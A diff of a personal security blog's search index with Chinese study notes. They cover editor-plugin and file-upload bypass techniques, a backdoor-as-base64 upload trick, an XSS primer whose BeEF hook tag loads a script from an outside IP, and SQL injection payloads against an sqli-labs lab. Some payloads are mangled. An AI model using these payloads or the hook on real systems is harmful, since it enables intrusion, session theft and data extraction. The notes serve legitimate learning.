title="编辑器分类："></a>编辑器分类：</h2><p>Ueditor<br>fckeditor<br>kindeditor<br>ewebeditor</p><p>白盒直接搜索editor</p><p>应用———-web应用引用的第三方插件</p><hr><p>白盒分析：</p><p>文件上传<br>上传图片：<br>图片解析有文件头并且把文件解析为base64格式</p><p>所以我们可以把后门代码解析成base64格式，插入文件解析中</p><p>文件头：<br>data%3Aimage%2image%base64xxxxxxxxxxxxxxxx<br>修改为PHP：<br>data%3Aimage%2php%base64xxxxxxxxxxxxxxxx（插入后门代码）<br>会覆盖原来上传的img文件为PHP文件</p><p>黑盒分析：<br>分析寻找抓包点，修改突破状态码及地址</p><p>审计流程：<br>功能点–代码文件–代码块–抓包调试–验证测试</p><p>白盒分析：</p><p>审计流程：同上</p><p>黑盒思路：探针目录利用编辑器漏洞测试</p><p>forbidden </p><p>当即文件夹由于.htaccess 设置禁止禁止访问.php .php2 等等文件</p><p>跳跃到上一个目录<br>.file&#x2F;x.php  ..&#x2F;x.php</p><p>fuck.php版本需要在5.45以下，然后为什么没有讲这个知识点老PHP都是高版本，大部分都是PHP7已经出8 了<br>白盒测试<br>直接打开文件目录</p><p>直接看到fck编辑器<br>直接搜索fck 编辑器漏洞</p><h2 id="———-白盒看三点："><a href="#———-白盒看三点：" class="headerlink" title="——— 白盒看三点："></a>——— 白盒看三点：</h2><p>1、中间件（中间件不同版本漏洞）（语言环境，）——–<br>2、编辑器（看编辑器，直接搜索该编辑器的漏洞）——–ditor<br>3、功能代码（程序员自己写的，可能会存在逻辑漏洞）—-</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>test</title>
+      <link href="/2023/05/08/CSRF-1/"/>
+      <url>/2023/05/08/CSRF-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="测试模板"><a href="#测试模板" class="headerlink" title="测试模板"></a>测试模板</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> test </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件上传基础-01</title>
+      <link href="/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/"/>
+      <url>/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。<br>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="1、常规类"><a href="#1、常规类" class="headerlink" title="1、常规类"></a>1、常规类</h3><ul><li>扫描获取上传</li><li>会员中心上传</li><li>后台系统上传</li><li>各种途径上传</li></ul><h3 id="2、CMS类"><a href="#2、CMS类" class="headerlink" title="2、CMS类"></a>2、CMS类</h3><ul><li>利用CMS源码</li></ul><h3 id="3、编辑器类-编辑器组件漏洞"><a href="#3、编辑器类-编辑器组件漏洞" class="headerlink" title="3、编辑器类(编辑器组件漏洞)"></a>3、编辑器类(编辑器组件漏洞)</h3><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul><h3 id="4、其他类-x2F-cve"><a href="#4、其他类-x2F-cve" class="headerlink" title="4、其他类&#x2F;cve"></a>4、其他类&#x2F;cve</h3><ul><li>代码审计</li><li>平台&#x2F;三方应用</li></ul><h2 id="文件上传黑-x2F-白名单绕过"><a href="#文件上传黑-x2F-白名单绕过" class="headerlink" title="文件上传黑&#x2F;白名单绕过"></a>文件上传黑&#x2F;白名单绕过</h2><h3 id="1、验证-x2F-绕过"><a href="#1、验证-x2F-绕过" class="headerlink" title="1、验证&#x2F;绕过"></a>1、验证&#x2F;绕过</h3><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><h5 id="1-js"><a href="#1-js" class="headerlink" title="1. js"></a>1. js</h5><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h5><pre><code>- 特殊解析后缀- .htaccess解析- 大小写绕过- 点绕过- 空格绕过- ::$DATA绕过- 配合解析漏洞- 双后缀名绕过</code></pre><h5 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2. 白名单"></a>2. 白名单</h5><pre><code>- MIME类型- %00截断- 0x00截断- 0x0a截断</code></pre><h5 id="3-内容以及其他"><a href="#3-内容以及其他" class="headerlink" title="3. 内容以及其他"></a>3. 内容以及其他</h5><pre><code>- 文件头检测- 二次渲染- 条件竞争- 突破getmagesize- 突破exif_imagetype</code></pre><h3 id="2、漏洞修复"><a href="#2、漏洞修复" class="headerlink" title="2、漏洞修复"></a>2、漏洞修复</h3><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><ul><li>IIS</li><li>Apache</li><li>Nginx</li></ul><h4 id="cms漏洞"><a href="#cms漏洞" class="headerlink" title="cms漏洞"></a>cms漏洞</h4><ul><li>某CMS上传漏洞未修复</li></ul><h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><ul><li><p>编辑器漏洞</p><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul></li><li><p>CVE漏洞</p><ul><li>CVE-2015</li><li>CVE-2016</li><li>CVE-2017</li></ul></li><li><p>安全修复</p></li></ul><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss笔记总结</title>
+      <link href="/2023/04/09/XSS-1/"/>
+      <url>/2023/04/09/XSS-1/</url>
+      
+        <content type="html"><![CDATA[<p>——— 鲁迅曾经说过，乱点链接的人就该中马。</p><h1 id="XSS（跨站脚本攻击）Cross-Site-Scripting"><a href="#XSS（跨站脚本攻击）Cross-Site-Scripting" class="headerlink" title="XSS（跨站脚本攻击）Cross-Site Scripting"></a>XSS（跨站脚本攻击）Cross-Site Scripting</h1><p><strong>啥是xss</strong> ：xss是被动式、注入攻击，把恶意代码想办法注入到你的程序中，获取需要的东西。</p><p>恶意代码通常是JavaScript、Java组件，VBScript，ActiveX，Flash或者就是原生的HTML。</p><blockquote><p>攻击者通过在目标网站上注入<strong>恶意脚本</strong>，使之在<strong>用户的浏览器</strong>上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如<strong>Cookie</strong>、<strong>SessionID</strong> 等，进而危害数据安全。</p></blockquote><h3 id="XSS的风险："><a href="#XSS的风险：" class="headerlink" title="XSS的风险："></a>XSS的风险：</h3><p>Web应用若存在XSS漏洞，就会有如下风险：</p><p>用户的浏览器中运行攻击者的恶意脚本，从而导致Cookie信息被窃取，用户身份被<strong>报名顶替</strong>。<br>攻击者能获得用户的权限来恶意<strong>使用Web应用的功能</strong>。<br>向用户显示<strong>伪造的输入表单</strong>，通过钓鱼式攻击窃取用户的个人信息。</p><blockquote><p>1、盗用cookie,获取敏感信息</p></blockquote><p>被攻击者已经登陆了该网站，所以持有该网站发送想用户浏览器发送的cookie</p><ul><li>cookie是浏览器向客户端发送的，用于识别身份，存储信息的。</li></ul><blockquote><p>客户端浏览器发送请求发送到服务器—》服务器—》发送HttpResponse响应（包含cookie）—》客户端浏览器保存cookie—》再次向该站点服务器发送请求是时，HttpRequest请求会包含该cookie—》服务器确定该浏览器信息，响应数据。</p></blockquote><blockquote><p>2、利用Flash钓鱼，取得更高权限</p></blockquote><blockquote><p>3、钓鱼欺骗</p></blockquote><p><strong>beef-xss</strong>搭建<strong>钓鱼服务器</strong><br>让被攻击者浏览加载<br><code>&lt;script src=&quot;http://47.94.236.117:3000/hook.js&quot;&gt;&lt;script&gt;</code></p><p><strong>钩子加载直接获取服务器</strong><br>&#x3D;cookie获取<br>跳转指向<br>社工钓鱼<br>配合漏洞</p><blockquote><p>4、网站挂马</p></blockquote><blockquote><p>5、垃圾信息发送</p></blockquote><blockquote><p>6、劫持用户Web行为</p></blockquote><blockquote><p>7、XSS蠕虫</p></blockquote><h3 id="xss-防御"><a href="#xss-防御" class="headerlink" title="xss 防御"></a>xss 防御</h3><p>XSS 防御的总体思路是：对输入(和 URL 参数)<strong>进行过滤</strong>，对<strong>输出进行编码</strong>。 也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚 本执行的相关内容；然后对动态输出到页面的内容进行 html 编码，使脚本无法 在浏览器中执行。</p><p>—xss修复</p><h4 id="1、进行字符过滤，过滤敏感字符"><a href="#1、进行字符过滤，过滤敏感字符" class="headerlink" title="1、进行字符过滤，过滤敏感字符"></a>1、进行字符过滤，过滤敏感字符</h4><p>ini_setting</p><h4 id="2、开启session-cookie-httponly-设置为1"><a href="#2、开启session-cookie-httponly-设置为1" class="headerlink" title="2、开启session.cookie_httponly 设置为1"></a>2、开启session.cookie_httponly 设置为1</h4><p>session.cookie_httponly&#x3D;1<br>ini_set(“session.cookie_httponly”,1);</p><h4 id="3、csp策略"><a href="#3、csp策略" class="headerlink" title="3、csp策略"></a>3、csp策略</h4><p>设置CSP（Content Securitu Policy）<br>header(“Content.Security.policy.img.src”self” “);</p><h4 id="4、输入长度限制"><a href="#4、输入长度限制" class="headerlink" title="4、输入长度限制"></a>4、输入长度限制</h4>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-报错注入</title>
+      <link href="/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>报错注入原理</strong><br>利用两个报错现象来实现注入，一是利用数据本身的报错信息，多是数据本身的错误，爆出提示信息。二是利用报错函数来爆出所需信息。</p><p><strong>报错注入的场景</strong><br>适合无直接回显的sql注入，存在报错页面的回显。</p><p><strong>常用报错函数</strong></p><h4 id="1-updatexml-（是mysql对xml文档数据进行查询和修改的xpath函数）"><a href="#1-updatexml-（是mysql对xml文档数据进行查询和修改的xpath函数）" class="headerlink" title="1.updatexml()（是mysql对xml文档数据进行查询和修改的xpath函数）"></a>1.updatexml()（是mysql对xml文档数据进行查询和修改的xpath函数）</h4><p>语法：</p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p></blockquote><p>爆库名</p><blockquote><p><a href="http://192.168.1.24:83/Less-5/?id=-1">http://192.168.1.24:83/Less-5/?id=-1</a>‘ and updatexml(1,concat(0x7e,database(),0x7e),1) – &#x3D;<br>爆表名<br><a href="http://192.168.1.24:83/Less-5/?id=-1">http://192.168.1.24:83/Less-5/?id=-1</a>‘ and updatexml(1,concat(0x7e,(  select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ ) ,0x7e),1) – &#x3D;</p></blockquote><h4 id="2-extractvalue-（是mysql对xml文档数据进行查询的xpath函数）"><a href="#2-extractvalue-（是mysql对xml文档数据进行查询的xpath函数）" class="headerlink" title="2.extractvalue()（是mysql对xml文档数据进行查询的xpath函数）"></a>2.extractvalue()（是mysql对xml文档数据进行查询的xpath函数）</h4><p><strong>语法：</strong></p><blockquote><p>extractvalue()函数的作用是从目标xml中返回包含所查询值的字符串<br>extractvalue (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为doc<br>第二个参数：XPath_string(Xpath格式的字符串)，Xpath定位必须是有效的，否则会发生错误</p></blockquote><p><strong>爆库名</strong></p><blockquote><p><a href="http://192.168.1.24:83/Less-5/?id=1">http://192.168.1.24:83/Less-5/?id=1</a>‘ and extractvalue(1,concat(0x7e,database())) – &#x3D;<br><strong>爆表名</strong><br><a href="http://192.168.1.24:83/Less-5/?id=1">http://192.168.1.24:83/Less-5/?id=1</a>‘ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) – &#x3D;</p></blockquote><h4 id="3-floor-（mysql中用来取整的函数）"><a href="#3-floor-（mysql中用来取整的函数）" class="headerlink" title="3.floor()（mysql中用来取整的函数）"></a>3.floor()（mysql中用来取整的函数）</h4><p>通过使用count()、floor()、rand()、group by四个条件形成主键重复的错误。其中：</p><blockquote><p>floor(x)：对参数x向下取整，比如floor(0.2)&#x3D;0，floor(3.6)&#x3D;3。<br>rand( )：生成一个0~1之间的随机浮点数。<br>count(*)：统计某个表下总共有多少条记录。<br>group by x：按照（by）一定的规则（x）进行分组。</p></blockquote><p><strong>爆库名：</strong></p><blockquote><p><a href="http://192.168.1.24:83/Less-5/?id=-1">http://192.168.1.24:83/Less-5/?id=-1</a>‘ and (select 1 from (select count(*),concat(database(),floor(rand(0)<em>2))x from information_schema.tables group by x)a) – &#x3D;<br><strong>爆user表名：</strong><br><a href="http://192.168.1.24:83/Less-5/?id=-1">http://192.168.1.24:83/Less-5/?id=-1</a>‘ and (select 1 from (select count(</em>),concat((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)– +</p></blockquote><h4 id="4-exp-（此函数返回e-自然对数的底-指数X的幂值）"><a href="#4-exp-（此函数返回e-自然对数的底-指数X的幂值）" class="headerlink" title="4.exp()（此函数返回e(自然对数的底)指数X的幂值）"></a>4.exp()（此函数返回e(自然对数的底)指数X的幂值）</h4><p><strong>爆表名：</strong></p><blockquote><p><a href="http://192.168.1.24:83/Less-5/?id=1">http://192.168.1.24:83/Less-5/?id=1</a>‘ and exp(~(select * from (select database() ) a) ) – &#x3D;</p></blockquote><p><strong>爆库名：</strong></p><blockquote><p><a href="http://192.168.1.24:83/Less-5/?id=-1">http://192.168.1.24:83/Less-5/?id=-1</a>‘ and exp(~(select * from (select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1) a) ) – &#x3D;</p></blockquote><p>注：floor和exp函数在MySQL8.0中不适用，在MySQL5.5能够正常返回错误信息！</p><p><strong>其他报错函数（了解）</strong><br>1、通过NAME_CONST报错,注入语句如下:</p><blockquote><p>and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p></blockquote><p>2、通过join报错,注入语句如下:</p><blockquote><p>select * from(select * from mysql.user ajoin mysql.user b)c;</p></blockquote><p>3、通过GeometryCollection()报错,注入语句如下:</p><blockquote><p>and GeometryCollection(()select *from(select user () )a)b );</p></blockquote><p>4、通过polygon ()报错,注入语句如下:</p><blockquote><p>and polygon (()select * from(select user ())a)b );</p></blockquote><p>5、通过multipoint ()报错,注入语句如下:</p><blockquote><p>and multipoint (()select * from(select user() )a)b );</p></blockquote><p>6、通过multlinestring ()报错,注入语句如下:</p><blockquote><p>and multlinestring (()select * from(selectuser () )a)b );</p></blockquote><p>7、通过multpolygon ()报错,注入语句如下:</p><blockquote><p>and multpolygon (()select * from(selectuser () )a)b );</p></blockquote><p>8、通过linestring ()报错,注入语句如下:</p><blockquote><p>and linestring (()select * from(select user() )a)b );</p></blockquote><p>参考文章：<a href="https://blog.csdn.net/m0_60988110/article/details/123544853">https://blog.csdn.net/m0_60988110/article/details/123544853</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-堆叠注入</title>
+      <link href="/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询。原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，<br>例如</p><blockquote><p>select * from users;show databases;</p></blockquote><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够。虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><p><strong>源码分析：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con1</span>, <span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database: <span class="subst">$dbname</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_more_results</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SQL语句查询使用的是mysqli_multi_query函数，mysqli_multi_query函数可以执行多条SQL语句，因此可能存在堆叠注入。</p><p>输入<code>http://192.168.1.24:83/Less-38/?id=1&#39;;insert into security.users(id,username,password) value(111,&#39;aaa&#39;,&#39;bbb&#39;) -- =</code>后，发现回显正常，查看user表数据，发现后面的插入语句已经被执行了，那么肯定就存在堆叠注入了。</p><p>参考文件：<a href="https://blog.csdn.net/qq_42562304/article/details/125255549">https://blog.csdn.net/qq_42562304/article/details/125255549</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-二次注入</title>
+      <link href="/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p><strong>原理：</strong></p><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p><p><strong>注入条件</strong></p><p>（1）用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）<br>（2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p><p><strong>过程</strong></p><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><blockquote><p>输入恶意SQL语句–》函数转译–》进入数据库，第一次不会引发注入–》用户调用数据会调出第一次注入的SQL语句–》二次注入行成</p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-盲注</title>
+      <link href="/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"/>
+      <url>/2023/03/31/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一、布尔盲注"><a href="#一、布尔盲注" class="headerlink" title="一、布尔盲注"></a>一、布尔盲注</h2><p><strong>特征</strong>：没有回显数据，看不到结果<br>只有登录成功或者失败，两种情况才可以使用</p><p>后端数据库代码<br>1、猜数据库长度</p><blockquote><p>select * from user where name &#x3D; ‘$name’ ;</p></blockquote><p>url:接收 ：</p><blockquote><p>? name &#x3D; admin | ‘ and length( database () )&#x3D;猜数据库长度 </p></blockquote><p>猜错为空，猜对则有回显。</p><p>2、猜数据库名（可以暴库）</p><blockquote><p>? name &#x3D; admin | ‘ and substr( database() , 1 ,1) &#x3D; ‘ 猜的第一位名称 ‘  #</p></blockquote><p>猜错为空，直到爆出数据库名称。</p><p>3、猜数据库中表的长度</p><p>猜第一个表长度</p><blockquote><p>‘and length((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1))&#x3D;6–+</p></blockquote><p>猜第二个表长度</p><blockquote><p>‘and length((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 1,1))&#x3D;8–+</p></blockquote><p>4、猜表名<br>猜第一个表的第一个字符</p><blockquote><p>‘and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&#x3D;117–+</p></blockquote><p>第二个表的第二个字符</p><blockquote><p>‘and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 1,1),1,1))&#x3D;117–+</p></blockquote><p>5、猜字段长度</p><blockquote><p>‘and length((select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 0,1))&#x3D;6–+‘</p></blockquote><p>6、判断字段名</p><p>第一位长度名称的一个字母的ASCII</p><blockquote><p>‘and ord(substr((select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 1,1),1,1))&#x3D;117–+</p></blockquote><p>第二位长度名称的一个字母的ASCII</p><blockquote><p>‘and ord(substr((select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 1,1),2,1))&#x3D;115–+</p></blockquote><p><strong>需要掌握函数:</strong></p><blockquote><p>length（str）函数 返回字符串的长度<br>    substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度<br>    ascii（）返回字符的ascii码，返回该字符对应的ascii码<br>    count（）：返回当前列的数量<br>    case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2</p></blockquote><blockquote><p>如果程序过滤了substr函数，可以用其他 <strong>函数代替</strong> ：效果与substr（）一样<br>    left（str，index）从左边第index开始截取<br>    right(str，index)从右边第index开始截取<br>    substring（str，index）从左边index开始截取<br>    mid（str，index，len）截取str从index开始，截取len的长度<br>    lpad（str，len，padstr）<br>    rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</p></blockquote><blockquote><p>如果程序过滤了 &#x3D; （等于号），可以用in()、like代替，效果一样：</p></blockquote><blockquote><p>如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样：</p></blockquote><h2 id="二、时间盲注"><a href="#二、时间盲注" class="headerlink" title="二、时间盲注"></a>二、时间盲注</h2><p>界面返回值只有一种 true 无论输入任何值 